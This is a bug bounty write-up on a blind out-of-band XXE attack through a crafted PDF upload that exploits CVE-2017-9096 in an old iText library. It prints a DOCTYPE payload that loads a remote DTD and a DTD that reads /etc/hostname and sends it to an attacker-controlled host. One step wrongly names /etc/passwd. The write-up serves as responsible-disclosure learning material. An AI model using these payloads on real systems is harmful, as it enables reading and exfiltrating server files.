---
layout: ../../layouts/BlogLayout.astro
title: XXE Out-of-Band via a vulnerable iText library through a PDF file upload
description: This article explains how I found an XML External Entity (XXE) injection through a specially crafted PDF file.
tags: ["code", "html"]
time: 4
featured: true
timestamp: 2025-06-23T11:12:03+00:00
filename: xxe-oob-via-a-pdf-upload
---

Hey there! My name's Manuel Valdez, I go by the handles saurinn/saur1n across different bug bounty platforms but I spend my free time hacking on intigriti, mostly. This is my first writeup so go easy on me.

## Summary

This article explains how I found a Blind XXE via a version of iText which was vulnerable to CVE-2017-9096. This package had been used by a Bug bounty program's upstream service to handle/extract text and metadata from PDF documents through a file upload feature.


>The scope of this article does not include the definition of XXEs, sorry about that, I'm trying to make this as straightforward as I can, you know, KISS...

<img src="/kiss.gif" alt="kiss gif" width="800" height="300" />

---

## Mapping phase

My style of hacking is a bit feature-oriented, if I see something interesting or several moving parts working based on a particular functionality, I'm investing my time there. This time I was facing a web application that handles different documents like pictures, .xls and PDF files... Whenever I see some things going on with PDF files I'm definitely taking a look at it. 

There was an upload feature that allowed certain file types: png, jpg, xls, pdf, zip and some others. Uploading images seemed totally fine, clicking on its settings did not show anything interesting either. Then I selected two images and clicked the same settings button (hamburger icon), suddenly a new option showed up: "Merge files". This option combined the two images and embedded them into a single PDF file... 

Can you smell that right? 

<img src="/fish.gif" alt="kiss gif" width="800" height="300" />

Like I said, images being converted to PDF files looked pretty interesting to me, especially by taking a look at it and seeing the names of the two images inside the resulting file. 

At this point HTMLi to SSRF came to my mind, it's not a surprise to anyone that follows me on Twitter/X for a while that I love hunting for those but in this case it wasn't that easy <b>at first</b>. I tried a lot of tricks targeting the name of the files to get the HTML injection but what I tried didn't work. I stepped back a little bit and realized I hadn't checked the PDF metadata, classic mistake. 

By looking at the metadata some interesting strings got my attention. Take a look:

<img src="/itext.png" alt="pdf metadata" width="800" height="300" />

Java, iText, some guy named Paulo and some weird looking domain... Alright, being serious we have some interesting bits here:

- <b>pdftk-java 3.2.2</b>, an old Java port version of PDFtk, a toolkit for working with PDF files.

- <b>itext-paulo-155 (itextpdf.sf.net-lowagie.com)</b>, an iText library part of the PDFtk Java port. Bingo! By looking at the version it was a 20yo version!! 

>Btw, Paulo was the main dev from the project and the domain just a mistake by some dev of using the dash char to separate two domains (itextpdf.sf.net and lowagie.com) which we all know that's a no-no (of course, later on, someone totally not malicious registered <b>net-lowagie.com</b>, 🐟🎣...)


Anyway, by looking for iText vulns the first google entry pointed me to a High rated vulnerability, XXE, with an CVE assigned to it <b>CVE-2017-9096</b>.

>	The XML parsers in iText before 5.5.12 and 7.x before 7.0.3 do not disable external entities, which might allow remote attackers to conduct XML external entity (XXE) attacks via a crafted PDF.

<b>Crafted PDF</b>... cool, this involves some kind of tweak to a PDF file. Some dorks here and there I ran into a [Github repo](https://github.com/jakabakos/CVE-2017-9096-iText-XXE) with working steps to exploit this CVE.

## Exploitation phase

I went and followed every step, inserted an initial XXE payload: 

```html
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab">]>
```

to initally test for an SSRF on the suggested lines, uploaded it to the app and waited for a ping back to my collaborator... Nada... It has to be vulnerable right? Embedding the payload on different sections of the PDF file did nothing different. Changing the controlled host for some other just in case they had a blacklist on [well known OOB domains](https://x.com/saur1n/status/1888591256957210864) but still nothing.

By looking at the sample PDF file used for this exploit with nano (I use nano btw...) I had to find some other place to insert the code, searching for the string `<?xml` gave me some matches but on line 741 I saw this:

<img src="/nano.png" alt="pdf metadata" width="800" height="300" />

Alright, let's place it on line 742 then... Uploaded it... and ... wait for it... wait for it... 

<img src="/x.png" alt="pdf metadata" width="800" height="300" />

¡VAMOS! DNS and HTTP interactions.

So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java set me off a little... it was a pretty updated one, and to be honest I didn't want to think it through, trying to stay positive. Well, as always it was time to escalate the bug.

## Escalation phase

Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.

I had to try different variations of External Parameter entities (an entity referenced inside the DTD). After some trial and error I came up with two working payloads:

#### 1st. payload

```xml
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://attacker-server/poc.dtd">
%ext;
%ent;
]>
<root>&data;</root>
```

Let's break it down a bit...

The first payload is what I inserted in the PDF file:

1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.

2. `%ext;`: This immediately triggers the parser to process the fetched DTD file.

At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 

#### 2nd. payload

The external DTD file <b>poc.dtd</b>, hosted on the attacker's server that contains the actual exfiltration code:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
```

3. `<!ENTITY % file SYSTEM "file:///etc/hostname">`: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.

4. `<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">`: This is a nested entity. It defines a parameter entity %ent, whose value is the full declaration for a general entity named <b>data</b>. This part is key because it ensures the file content (%file) is read and included within the URL of the final call.


Back to the <b>1st. payload</b>:

5. `%ent;`: This line (#3) triggers the processing of the %ent entity from the remote DTD, in simple terms, this action brings the final, exfil command (&data;) into play, setting up the last step of the attack.

6. `<root>&data;</root>`: The parser now resolves the `&data;` general entity. This triggers a final HTTP request to `https://attacker-server`. The content of the `/etc/passwd` file is appended as a URL parameter (`?x=%file;`), and the server sends this request successfully exfiltrating the data to the attacker's controlled domain.



Alright, now with the theory out of the way, the 1st. payload was inserted on the PDF file, and the malicious DTD file (poc.dtd) ready on a controlled server, it was the moment of truth: upload, select and upload...

<img src="/xx.png" alt="poc" width="800" height="300" />

<img src="/oh.gif" alt="gif" width="800" height="300" />


I always wanted to use that gif... thanks [André](https://x.com/0xacb/status/1954674644524707894).

And just like that I successfully exfiltrated an internal filesystem file from the AWS instance. 
Great, let's try reading something more sensitive `/etc/passwd`:

No luck... 

The call to my collaborator was empty. I tried with different files but still nothing was returned to my collaborator instance. OK, until this point I'd read a ton of writeups about XXE on Java applications so I knew I was facing the line termination (multiline files) restriction, therefore only single line files could be read out.

Time to pull out the FTP trick to exfil multiline files, thanks to [Novikov](https://web.archive.org/web/20141023173000/http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html). I found a [script](https://github.com/lc/230-OOB/blob/master/230.py) created by [Corben Leo](https://x.com/hacker_) that emulates an FTP server for OOB attacks.

After having a some issues setting up the server on my VPS (skill issue), I finally was able to do it. Then, I repeated all the exploitation steps, which lead me to:  

Nada land, again.

At that point time was againts me and I hadn't written the report yet. Wrote everything, helped the triager with the crafted PDF file and the submission was successfuly Triaged. 

<img src="/props.png" alt="triaged" width="800" height="300" />

After two weeks of back and forth comments with the Program manager, discussing the impact that wasn't quite there because of the line termination restriction, we were able to work things out regarding to the final severity and bounty. They were able to backtrack the root cause and worked on a fix with the vendor running the third-party service, I can't say much but it was related to a cloud based product.


To wrap things up, be patient but consistent, be respectful and professional with the triage/security team because they are humans just like you. This bug taught me that sometimes, a bug's true impact isn't just about the exploit, but also about the communication and collaboration required to get it fixed.

A big shoutout to the team at Intigriti for running an awesome bug bounty platform. 

I hope you find it helpful, until next time.

Happy hacking! 

## References

- Späth, Christopher. "A Security Analysis of a Wide Range of XML Parsers." Master's Thesis, 2015.
- https://github.com/jakabakos/CVE-2017-9096-iText-XXE.
- https://web.archive.org/web/20141023173000/http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
- https://github.com/lc/230-OOB/blob/master/230.py
- https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities

